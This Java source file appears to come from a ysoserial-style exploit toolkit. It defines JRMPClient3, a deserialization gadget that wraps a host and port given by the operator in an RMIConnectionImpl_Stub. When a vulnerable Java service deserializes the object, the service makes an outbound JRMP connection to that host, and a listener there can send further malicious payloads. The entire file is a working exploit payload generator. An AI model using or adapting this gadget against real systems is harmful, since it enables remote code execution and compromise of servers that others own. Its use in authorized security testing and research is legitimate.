package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.PayloadTest;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.rmi.server.ObjID;
import java.util.Random;

@PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
@Authors({ Authors.MBECHLER,Authors.C0NY1 })
public class JRMPClient3 extends PayloadRunner implements ObjectPayload {
    public Object getObject(String command) throws Exception {
        String host;
        int port;
        int sep = command.indexOf(58);
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1)).intValue();
        }
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RMIConnectionImpl_Stub obj = new RMIConnectionImpl_Stub(ref);
        return obj;
    }

    public static void main(String[] args) throws Exception {}
}
